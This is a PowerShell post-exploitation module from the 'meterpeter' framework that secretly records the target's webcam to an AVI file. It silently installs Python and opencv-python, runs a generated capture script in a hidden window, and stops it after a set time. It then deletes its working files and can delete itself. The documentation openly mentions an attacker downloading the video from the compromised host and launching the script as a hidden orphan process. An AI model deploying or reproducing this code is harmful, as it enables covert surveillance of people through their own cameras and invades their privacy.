<#
.SYNOPSIS
   Capture video (AVI) using default webcam

   Author: @r00t-3xp10it
   Credits: @AHLASaad \ @AvinabSaha
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: python3
   Optional Dependencies: opencv-python
   PS cmdlet Dev version: v1.2.8

.DESCRIPTION
   Auxiliary Module of meterpeter v2.10.13 that uses python3 opencv-python to
   record video files (AVI format) using default camera attached to the computer.

.NOTES
   Remark: recording of webcam turns 'on' the camera ligth.
   Parameter RecTime accepts values from 15 seconds (minimum) up to 120 seconds (max)
   to prevent the AVI file to be very large if attacker needs to download it from host.
   Remark: Invoke -RecLimmit 'int' if you wish to record more than 120 seconds of video.
   Remark: Invoke -forceinstall switch to silent install all python3 cmdlet dependencies.

.Parameter RecTime
   Camera record time in seconds (default: 15)

.Parameter FileName
   Video.avi file name (default: meterpeter.avi)

.Parameter WorkingDir
   Cmdlet working directory (default: $Env:TMP)

.Parameter RecLimmit
   Record time limmit in seconds (default: 120)

.Parameter ForceInstall
   Silent install dependencies switch.

.Parameter AutoDel
   AutoDelete cmdlet in the end switch.

.EXAMPLE
   PS C:\> .\Invoke-WebCamAvi.ps1 -RecTime '20'
   Record webcam live stream for 20 seconds time

.EXAMPLE
   PS C:\> .\Invoke-WebCamAvi.ps1 -FileName "capture.avi"
   Record webcam live on capture.avi video file name

.EXAMPLE
   PS C:\> .\Invoke-WebCamAvi.ps1 -WorkingDir "$Env:TMP"
   Record webcam live and use %TMP% as working directory

.EXAMPLE
   PS C:\> .\Invoke-WebCamAvi.ps1 -forceinstall
   Silent install all python3 cmdlet dependencies

.EXAMPLE
   PS C:\> Start-Process -WindowStyle hidden powershell -argumentlist "-file Invoke-WebCamAvi.ps1 -rectime '60'"
   Execute cmdlet in a hidden terminal window for 60 seconds ( child detach from parent process - orphan )

.INPUTS
   None. You cannot pipe objects into Invoke-WebCamAvi.ps1

.OUTPUTS
   Recording webcam live in avi format.
   - Downloading python script from github.
   - Starting live capture for '10' seconds.
   - Comverting webcam raw data to AVI format.
   Storage: 'C:\Users\pedro\AppData\Local\Temp\meterpeter.avi'

.LINK
   https://github.com/r00t-3xp10it/meterpeter
   https://github.com/r00t-3xp10it/redpill/tree/main/lib/WebCam-Capture
   https://learn.microsoft.com/en-us/windows/package-manager/winget/install
   https://learnopencv.com/read-write-and-display-a-video-using-opencv-cpp-python
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$FileName="meterpeter.avi",
   [string]$WorkingDir="$Env:TMP",
   [switch]$ForceInstall,
   [int]$RecLimmit='120',
   [int]$RecTime='15',
   [switch]$AutoDel
)


$cmdletver = "v1.2.8"
$StartPath = (Get-Location).Path
$ErrorActionPreference = "SilentlyContinue"
$host.UI.RawUI.WindowTitle = "@Invoke-WebCamAvi $cmdletver"
write-host "`n  Recording webcam live in avi format." -ForegroundColor Green


#Make sure working directory exists
If(-not(Test-Path -Path "$WorkingDir"))
{
   write-host "  x " -ForegroundColor Red -NoNewline
   write-host "NotFound: " -ForegroundColor DarkGray -NoNewline
   write-host "$WorkingDir`n" -ForegroundColor Red
   return
}

$CheckInstall = $null
$CheckInstall = (Python -V)
## Make sure Python is installed
If($CheckInstall -iNotMatch '^(Python+\s+\d*)')
{
   write-host "  x " -ForegroundColor Red -NoNewline
   write-host "Fail Dependencie: " -ForegroundColor DarkGray -NoNewline

   If($ForceInstall.IsPresent)
   {
      ## Silently install Python3 dependencie
      write-host "Trying to silent install python3" -ForegroundColor Red

      ## Make sure Python.3.12 is available
      $available = (winget search --id 'Python.Python.3.12' --exact|Select-String -Pattern 'Python.3.12')

      If($available -Match 'Python.Python.3.12')
      {
         winget install --id 'Python.Python.3.12' --silent --accept-package-agreements --accept-source-agreements --disable-interactivity
      }
   }
   Else
   {
      write-host "Module requires python3 installed." -ForegroundColor Red
      write-host "  - " -ForegroundColor Yellow -NoNewline
      write-host "Invoke -forceinstall for silent install dependencies.`n"
      return
   }
}

$OPenCVTest = $null
## Make sure opencv-python dependencie is installed
Start-Process -WindowStyle Hidden powershell -ArgumentList "[bool](pip list|findstr /C:`"opencv-python`") > '$WorkingDir\opencv.log'" -Wait
$OPenCVTest = Get-Content -Path "$WorkingDir\opencv.log"
If(-not($OPenCVTest) -or ($OPenCVTest -iNotMatch 'True'))
{
   write-host "  x " -ForegroundColor Red -NoNewline
   write-host "Fail Dependencie: " -ForegroundColor DarkGray -NoNewline

   If($ForceInstall.IsPresent)
   {
      ## Silent-Install python3 dependencies
      write-host "Trying to silent install opencv-python" -ForegroundColor Red
      echo y|pip install opencv-python --exists-action i --no-warn-conflicts
   }
   Else
   {
      write-host "Module requires opencv-python installed." -ForegroundColor Red
      write-host "  - " -ForegroundColor Yellow -NoNewline
      write-host "Invoke -forceinstall for silent install dependencies.`n"
      return
   }
}

## Record Time settings [min vs max]
If($RecTime -gt $RecLimmit -or $RecTime -lt 15)
{
   [int]$RecTime = '15'
   write-host "  x " -ForegroundColor Red -NoNewline
   write-host "NotOptimal: " -ForegroundColor DarkGray -NoNewline
   write-host "record time, default to $RecTime sec." -ForegroundColor Yellow
}

## Delete old avi file if exists
If(Test-Path -Path "${WorkingDir}\${FileName}")
{
   Remove-Item -Path "${WorkingDir}\${FileName}" -Force
}


## Raw Python Script
$RawPythonScript = @("import sys
sys.path.append(`"c:\\users\\pedro\\appdata\\local\\programs\\python\\python39\\lib\\site-packages`")
import cv2
import numpy as np

cap = cv2.VideoCapture(0)
if(cap.isOpened() == False): 
  print(`"Unable to read camera feed..`")

frame_width = int(cap.get(3))
frame_height = int(cap.get(4))

out = cv2.VideoWriter('$FileName',cv2.VideoWriter_fourcc('M','J','P','G'), 10, (frame_width,frame_height))

while(True):
  ret, frame = cap.read()

  if ret == True: 
    
    out.write(frame)

    #Press Q on keyboard to stop recording
    if cv2.waitKey(1) & 0xFF == ord('q'):
      break
  else:
    break

cap.release()
out.release()
cv2.destroyAllWindows()")


## Create WebCam.py script
write-host "  - " -ForegroundColor Green -NoNewline
write-host "Creating: " -NoNewline
write-host "$WorkingDir\WebCam.py" -ForegroundColor Green
echo $RawPythonScript|Out-File "$WorkingDir\WebCam.py" -Encoding string -Force


$RegInstallPath = $null
## Config WebCam.py python script
$ReplaceMe = Get-Content -Path "$WorkingDir\WebCam.py"
$RegInstallPath = (Python -c "import os, sys; print(os.path.dirname(sys.executable))")
If(-not($RegInstallPath) -or ($RegInstallPath -eq $null))
{
   write-host "  x " -ForegroundColor Red -NoNewline
   write-host "Notfound: " -ForegroundColor DarkGray -NoNewline
   write-host "PythonCore\InstallPath" -ForegroundColor Red
   Start-Sleep -Seconds 1

   $RegInstallPath = "$Env:LOCALAPPDATA\Programs\python"
   write-host "  - " -ForegroundColor Yellow -NoNewline
   write-host "Use-Path: " -ForegroundColor DarkGray -NoNewline
   write-host "$Env:LOCALAPPDATA\Programs\python" -ForegroundColor Green
}

$technic = $null
$PythonInstallPath = $null
## Get python 'site-packages' directory
$PythonInstallPath = (Get-ChildItem -Path "$RegInstallPath" -Recurse -Force|Where-Object {$_.PSIsContainer -Match "True" -and $_.Name -iMatch 'site-packages'}).FullName
If($PythonInstallPath)
{
   <#
   .NOTES
      technic nº 1 replaces the 'sys.path.append()'
      by target user python site-packages location
   #>

   $technic = "1"
   #replace path in python script
   $ReplaceMe = $PythonInstallPath -replace '\\','\\'
   ((Get-Content -Path "$WorkingDir\WebCam.py" -Raw) -Replace "c:\\\\users\\\\pedro\\\\appdata\\\\local\\\\programs\\\\python\\\\python39\\\\lib\\\\site-packages","$ReplaceMe")|Set-Content -Path "$WorkingDir\WebCam.py" -Force
}
Else
{
   <#
   .NOTES
      technic nº 2 delete the 'import sys' and
      'sys.path.append()' lines from webcam.py
   #>

   $technic = "2"
   $ParseRawData = Get-Content -Path "$WorkingDir\WebCam.py"|Select-Object -Skip 2
   echo $ParseRawData > "$WorkingDir\WebCam.py"
}


cd "$WorkingDir"
## Start live capture
write-host "  - " -ForegroundColor DarkYellow -NoNewline
write-host "Starting live capture for '" -NoNewline
write-host "$RecTime" -ForegroundColor DarkGreen -NoNewline
write-host "' seconds."
Start-Process -WindowStyle hidden python -ArgumentList "WebCam.py"


## Capture stop time
[int]$RecTime = $RecTime+1
Start-Sleep -Seconds $RecTime
## Stop capture after sellected time
Stop-Process -Name "python*" -Force


## Comverting webcam raw data to AVI format.
write-host "  - " -ForegroundColor DarkYellow -NoNewline
write-host "Comverting webcam raw data to AVI format."
Start-Sleep -Seconds 7 #Give some time to allow avi to finish

#Make sure video.avi file was created
If(-not(Test-Path -Path "${WorkingDir}\${FileName}"))
{
   write-host "  x " -ForegroundColor Red -NoNewline
   write-host "fail to create: '" -ForegroundColor DarkGray -NoNewline
   write-host "${WorkingDir}\${FileName}" -ForegroundColor Red -NoNewline
   write-host "' (technic:$technic)" -ForegroundColor DarkGray

   write-host "  + Trying alternative execution method.." -ForegroundColor DarkYellow
   $ParseRawData = Get-Content -Path "$WorkingDir\WebCam.py"|Select-Object -Skip 2
   echo $ParseRawData > "$WorkingDir\WebCam.py";Start-Sleep -Milliseconds 800

   Start-Process -WindowStyle hidden python -ArgumentList "WebCam.py"
   Start-Sleep -Seconds $RecTime
   #Stop capture after sellected time
   Stop-Process -Name "python*" -Force

   Start-Sleep -Milliseconds 1300
   If(-not(Test-Path -Path "${WorkingDir}\${FileName}"))
   {
      write-host "  x " -ForegroundColor Red -NoNewline
      write-host "fail to create: '" -ForegroundColor DarkGray -NoNewline
      write-host "${FileName}" -ForegroundColor Red -NoNewline
      write-host "' (technic:2)" -ForegroundColor DarkGray      
   }
   Else
   {
      write-host "  Storage: '" -ForegroundColor DarkGray -NoNewline
      write-host "${WorkingDir}\${FileName}" -ForegroundColor Green -NoNewline
      write-host "'" -ForegroundColor DarkGray      
   }
}
Else
{
   write-host "  Storage: '" -ForegroundColor DarkGray -NoNewline
   write-host "${WorkingDir}\${FileName}" -ForegroundColor Green -NoNewline
   write-host "' (technic:$technic)" -ForegroundColor DarkGray
}


## Cleanup
write-host ""
cd "$StartPath"
Remove-Item -Path "$WorkingDir\WebCam.py" -Force
Remove-Item -Path "$WorkingDir\opencv.log" -Force

If($AutoDel.IsPresent)
{
   ## Auto-Delete cmdlet in the end ...
   Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
}
exit